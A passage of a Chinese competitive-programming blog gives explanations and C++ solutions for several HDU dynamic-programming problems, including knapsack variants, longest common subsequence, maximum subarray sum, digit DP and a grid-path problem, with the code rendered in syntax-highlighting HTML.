class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">                a[i][j]+=max(a[i+<span class="number">1</span>][j],a[i+<span class="number">1</span>][j+<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[<span class="number">1</span>][<span class="number">1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="G-免费馅饼"><a href="#G-免费馅饼" class="headerlink" title="G - 免费馅饼"></a><a href="https://vjudge.net/problem/HDU-1176" target="_blank" rel="noopener">G - 免费馅饼</a></h3><p>可以发现时刻的范围不是很大，把每个时刻看作每一层，这个问题就是三条边的数塔。<br>代码中平移一下是为了避免越界问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> dp[N][<span class="number">13</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n),n) &#123;</div><div class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">        <span class="keyword">int</span> m=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x,t;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;t);</div><div class="line">            ++dp[t][x+<span class="number">1</span>];</div><div class="line">            m=max(m,t);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=m;i&gt;=<span class="number">0</span>;i--) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">11</span>;j++) &#123;</div><div class="line">                dp[i][j]+=max(max(dp[i+<span class="number">1</span>][j<span class="number">-1</span>],dp[i+<span class="number">1</span>][j]),dp[i+<span class="number">1</span>][j+<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[<span class="number">0</span>][<span class="number">6</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="A-饭卡"><a href="#A-饭卡" class="headerlink" title="A - 饭卡"></a><a href="https://vjudge.net/problem/HDU-2546" target="_blank" rel="noopener">A - 饭卡</a></h3><p>首先排除余额已经少于$5$的情况，然后分为$m-5$和$5$两部分，前面的$m-5$是个01背包问题，后面的$5$用来买最后一次。若用$dp(x)$表示$x$能买到的最大价值，那么答案为$m-dp(m-5)-a_i (1\le i\le n)$。<br>可以证明，最后买最贵的是最优的。比较复杂，这里仅通过$m-dp(m-5)-a_p$这个式子简要说明，如果最后买的不是最贵的，即 $p’ \neq p$：</p><ul><li>$a_{p’}\le a_{p}$</li><li>背包的物品集合加入了一个体积大的，去掉了一个体积小的；又有价值跟体积的值相等，所以$dp’(m-5)\le dp(m-5)$</li></ul><p>两个减数都减小，最后的结果只会变大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1100</span>;</div><div class="line"><span class="keyword">int</span> a[N],dp[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n),n) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</div><div class="line">        <span class="keyword">if</span> (m&lt;<span class="number">5</span>) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,m);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">int</span> p=max_element(a+<span class="number">1</span>,a+n+<span class="number">1</span>)-a;</div><div class="line">            m-=<span class="number">5</span>;</div><div class="line">            <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">if</span> (i==p) <span class="keyword">continue</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=m;j&gt;=a[i];j--) &#123;</div><div class="line">                    dp[j]=max(dp[j],dp[j-a[i]]+a[i]);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,m+<span class="number">5</span>-dp[m]-a[p]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="B-Piggy-Bank"><a href="#B-Piggy-Bank" class="headerlink" title="B - Piggy-Bank"></a><a href="https://vjudge.net/problem/HDU-1114" target="_blank" rel="noopener">B - Piggy-Bank</a></h3><p>已知存钱罐的确切重量，问最小可能价值。是恰好型的完全背包。<br>稍微讲一下完全背包一维的转移方程：<br>$$dp(j)=max(dp(j),dp(j-w_i)+v_i)$$ $j$从小到大枚举时，由于之前的$dp$值已经更新过了，就直接达到了无限个物品的效果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">10010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;</div><div class="line"><span class="keyword">int</span> dp[M];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        m-=n;</div><div class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</div><div class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> p,w;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;p,&amp;w);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=w;j&lt;=m;j++) &#123;</div><div class="line">                dp[j]=min(dp[j],dp[j-w]+p);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (dp[m]==INF) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"This is impossible."</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"The minimum amount of money in the piggy-bank is %d.\n"</span>,dp[m]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="C-Investment"><a href="#C-Investment" class="headerlink" title="C - Investment"></a><a href="https://vjudge.net/problem/HDU-1963" target="_blank" rel="noopener">C - Investment</a></h3><p>给出本金、很多种债券和各自的利息，问$y$年以后最多能有多少钱，抽象一下就是做$y$次完全背包。<br>但是这题里面容量太大了做不了完全背包，所以题目里又给了一个条件，债券的价格都是$1000$的整数倍，那么直接把本金除以$1000$当作背包容量就行了，重复做$y$次。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> w[<span class="number">22</span>],v[<span class="number">22</span>];</div><div class="line"><span class="keyword">int</span> dp[<span class="number">50000</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n,M,Y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;M,&amp;Y);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;w[i],&amp;v[i]);</div><div class="line">            w[i]/=<span class="number">1000</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> (Y--) &#123;</div><div class="line">            <span class="keyword">int</span> m=M/<span class="number">1000</span>;</div><div class="line">            <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=w[i];j&lt;=m;j++) &#123;</div><div class="line">                    dp[j]=max(dp[j],dp[j-w[i]]+v[i]);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            M+=dp[m];</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,M);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="D-Common-Subsequence"><a href="#D-Common-Subsequence" class="headerlink" title="D - Common Subsequence"></a><a href="https://vjudge.net/problem/HDU-1159" target="_blank" rel="noopener">D - Common Subsequence</a></h3><p>经典问题，最长公共子序列。<br><img src="http://img.blog.csdn.net/20160529225550069" alt="子串与子序列"><br>设$C(i,j)$为$x_{1\dots i}$和$y_{1\dots j}$的最长公共子序列的长度，那么有：<br>$$\large C(i,j)=\begin{cases}<br>0 &amp; \text{$i=0$ or $j=0$} \\<br>C(i-1,j-1)+1 &amp; i,j\gt 0, x_i=y_j \\<br>max(C(i,j-1),C(i-1,j)) &amp; i,j \gt 0, x_i\neq y_j<br>\end{cases}$$ 第一种情况很好理解。第二种情况就是$x_i$和$y_j$用来匹配了，所以等于了这两个都不用的情况$C(i-1,j-1)$加$1$。第三种情况就是不用$x_i$或者不用$y_j$取一个最大值。<br>其实第三种是最基本的情况，但是由于$max(C(i,j-1),C(i-1,j))$不会比$C(i-1,j-1)+1$更优（为什么？），所以第二种情况中可以不考虑第三种。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span> a[<span class="number">1010</span>],b[<span class="number">1010</span>];</div><div class="line"><span class="keyword">int</span> dp[<span class="number">1010</span>][<span class="number">1010</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,a+<span class="number">1</span>,b+<span class="number">1</span>)!=EOF) &#123;</div><div class="line">        <span class="keyword">int</span> n=<span class="built_in">strlen</span>(a+<span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> m=<span class="built_in">strlen</span>(b+<span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                <span class="keyword">if</span> (a[i]==b[j]) dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</div><div class="line">                <span class="keyword">else</span> dp[i][j]=max(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[n][m]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="E-Max-Sum"><a href="#E-Max-Sum" class="headerlink" title="E - Max Sum"></a><a href="https://vjudge.net/problem/HDU-1003" target="_blank" rel="noopener">E - Max Sum</a></h3><p>经典问题，最大子列和。（<strong>连续子序列</strong>，相当于子串）<br>状态转移方程也比较简单：<br>$$dp(i)=max(dp(i-1)+a[i],a[i])=max(dp(i-1),0)+a[i]$$ 分别对应两种情况：</p><ol><li>接在上一次序列的后面</li><li>开始一个新的序列</li></ol><p>输出的字典序最小意味着左端点和右端点都要最小。如果先记录右端点再反向计算左端点，那么：</p><ul><li>$dp$值相等时，右端点不被更新</li><li>和相等时，左端点要被更新</li></ul><p>当然也有其它的记录方法，比如利用数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">28</span>;</div><div class="line"><span class="keyword">int</span> a[N],f[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,cas=<span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> ans=-INF,p,q;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            f[i]=max(f[i<span class="number">-1</span>],<span class="number">0</span>)+a[i];</div><div class="line">            <span class="keyword">if</span> (f[i]&gt;ans) &#123;</div><div class="line">                ans=f[i];</div><div class="line">                q=i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> now=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=q;i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            now+=a[i];</div><div class="line">            <span class="keyword">if</span> (now==ans) p=i;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d:\n"</span>,++cas);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,ans,p,q);</div><div class="line">        <span class="keyword">if</span> (T) <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="H-不要62"><a href="#H-不要62" class="headerlink" title="H - 不要62"></a><a href="https://vjudge.net/problem/HDU-2089" target="_blank" rel="noopener">H - 不要62</a></h3><p>常见$dp$类型：数位$dp$。可以使用数位$dp$的$dfs$型模板，原理自行查阅。<br><em>ps.</em> 这题数据量比较小，可以预处理$O(1)$回答，但是大家还是要好好学习数位$dp$滴。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> D=<span class="number">22</span>;</div><div class="line"><span class="keyword">int</span> dig[D];</div><div class="line">ll f[D][<span class="number">10</span>][<span class="number">2</span>];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> pre,<span class="keyword">int</span> fg,<span class="keyword">int</span> limit)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span>) <span class="keyword">return</span> fg==<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (!limit&amp;&amp;f[pos][pre][fg]!=<span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">return</span> f[pos][pre][fg];</div><div class="line">    &#125;</div><div class="line">    ll res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> last=limit?dig[pos]:<span class="number">9</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=last;i++) &#123;</div><div class="line">        res+=dfs(pos<span class="number">-1</span>,i,fg||(pre==<span class="number">6</span>)&amp;&amp;(i==<span class="number">2</span>)||i==<span class="number">4</span>,limit&amp;&amp;(i==last));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!limit) f[pos][pre][fg]=res;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">solve</span><span class="params">(ll n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        dig[len++]=n%<span class="number">10</span>;</div><div class="line">        n/=<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> dfs(len<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">if</span> (!n&amp;&amp;!m) <span class="keyword">break</span>;</div><div class="line">        <span class="built_in">memset</span>(f,<span class="number">-1</span>,<span class="keyword">sizeof</span>(f));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,solve(m)-solve(n<span class="number">-1</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="I-Unidirectional-TSP"><a href="#I-Unidirectional-TSP" class="headerlink" title="I - Unidirectional TSP"></a><a href="https://vjudge.net/problem/HDU-1619" target="_blank" rel="noopener">I - Unidirectional TSP</a></h3><p>常见$dp$类型：网格图$dp$。如果不考虑上下可以穿越，那么转移方程非常简单：<br>$$dp(i,j)=min(dp(i-1,j-1),dp(i,j-1),dp(i+1,j-1))$$ 上下可以穿越时，需要根据$i$的值特殊处理一下，代码里用的是三目表达式。<br>因为题目要求输出路径，所以用$a_i$储存前一列可以转移过来的行号，又因为题目里要求字典序最小，所以先排个序，之后按照顺序更新，并约定<strong>值相等的不能更新</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">110</span>,INF=<span class="number">1</span>&lt;&lt;<span class="number">28</span>;</div><div class="line"><span class="keyword">int</span> dp[N][N],pre[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;dp[i][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;i&#125;;</div><div class="line">                a[<span class="number">1</span>]=(i==<span class="number">1</span>)?n:i<span class="number">-1</span>;</div><div class="line">                a[<span class="number">2</span>]=(i==n)?<span class="number">1</span>:i+<span class="number">1</span>;</div><div class="line">                sort(a,a+<span class="number">3</span>);</div><div class="line">                <span class="keyword">int</span> x=INF,y=<span class="number">-1</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++) &#123;</div><div class="line">                    <span class="keyword">if</span> (dp[a[k]][j<span class="number">-1</span>]&lt;x) &#123;</div><div class="line">                        x=dp[y=a[k]][j<span class="number">-1</span>];</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                dp[i][j]+=x;</div><div class="line">                pre[i][j]=y;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> x=INF,y=<span class="number">-1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> 